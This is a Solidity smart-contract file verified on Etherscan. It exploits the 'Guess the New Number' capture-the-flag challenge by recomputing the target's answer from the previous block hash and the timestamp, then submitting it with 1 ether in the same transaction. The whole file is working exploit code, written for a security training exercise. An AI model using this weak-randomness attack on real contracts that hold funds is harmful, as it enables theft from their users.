/**
 *Submitted for verification at Etherscan.io on 2022-07-20
*/

pragma solidity ^0.4.21;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) public payable;
    function isComplete() public view returns (bool);
}

contract CTFGuessTheNewNumber {
    address public guessschallangeAddress;
    uint256 public lastFullAnswer;
    uint8   public lastAnswer;

    function CTFGuessTheNewNumber() public payable{
        require(msg.value == 1 ether);
    }

    function setGuessMeAddress(address _address) public {
        guessschallangeAddress = _address;
    }

    function getGuessAddress() public view returns(address) {
        return guessschallangeAddress;
    }
    
    function doCaptureByBlockNum(uint nBlockNum) public {
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(keccak256(block.blockhash(nBlockNum), now));
        guessInstance.guess.value(1 ether)(answer);
    }

    function doCapture() public {
        uint nLastBlock = block.number - 1;
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(uint256(keccak256(block.blockhash(nLastBlock), now)));
        guessInstance.guess.value(1 ether)(answer);
    }

    function doWithLastAnswer()public {
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        guessInstance.guess.value(1 ether)(lastAnswer);
    }

    function doExample() public {
        uint nLastBlock = block.number - 1;
        lastFullAnswer = uint256(keccak256(block.blockhash(nLastBlock), now));
        lastAnswer = uint8(lastFullAnswer);
    }

    function dontHaveCap() public {
        uint nLastBlock = block.number - 1;
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(keccak256(block.blockhash(nLastBlock), now));
        guessInstance.guess.value(1 ether)(answer);
    }

    function dontHaveCapExample() public view returns(uint8){
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        return answer;
    }

    function hasComplete() public view returns(bool){
        
        IGuessTheNewNumberChallenge guessInstance = IGuessTheNewNumberChallenge(guessschallangeAddress);
        bool complete = guessInstance.isComplete();
        return complete;
    }
}